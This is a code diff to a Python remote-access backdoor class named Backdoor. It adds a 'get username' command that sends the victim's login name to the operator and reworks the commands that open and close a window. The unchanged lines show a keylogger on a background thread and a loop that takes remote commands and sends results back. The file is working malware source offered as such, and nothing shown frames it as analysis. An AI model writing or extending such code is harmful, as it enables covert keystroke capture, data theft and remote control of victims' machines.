@@ -90,6 +90,8 @@ class Backdoor:
 		self.cursor_blocking = False
 		self.music_thread = None
 
+		self.window_thread = None
+
 		keyboard.on_press(logger)
 		keylogger = threading.Thread(target=keyboard.wait)
 		keylogger.start()
@@ -189,6 +191,9 @@ class Backdoor:
 				if command == "exit":
 					self.reliable_send("Exiting...")
 					self.connected = False
+
+				elif command == "get username":
+					self.reliable_send(os.getlogin())
 
 				elif command.split()[0] == "cd":
 					path = command.replace("cd", "").strip()
@@ -301,14 +306,21 @@ class Backdoor:
 					res = self.execute_async(command)
 					self.reliable_send(res)
 
-				elif command == "window":
-					self.window_thread = multiprocessing.Process(target=self.show_window)
-					self.window_thread.start()
-					self.reliable_send("[+] Opened")
+				elif command == "open window":
+					if not self.window_thread:
+						self.window_thread = multiprocessing.Process(target=self.show_window)
+						self.window_thread.start()
+						self.reliable_send("[+] Opened")
+					else:
+						self.reliable_send("[~] Window is opened")
 					
 				elif command == "close window":
-					self.window_thread.terminate()
-					self.reliable_send("[+] Closed")
+					if self.window_thread:
+						self.window_thread.terminate()
+						self.reliable_send("[+] Closed")
+						self.window_thread = None
+					else:
+						self.reliable_send("[~] Window is not opened")
 					
 
 				else:
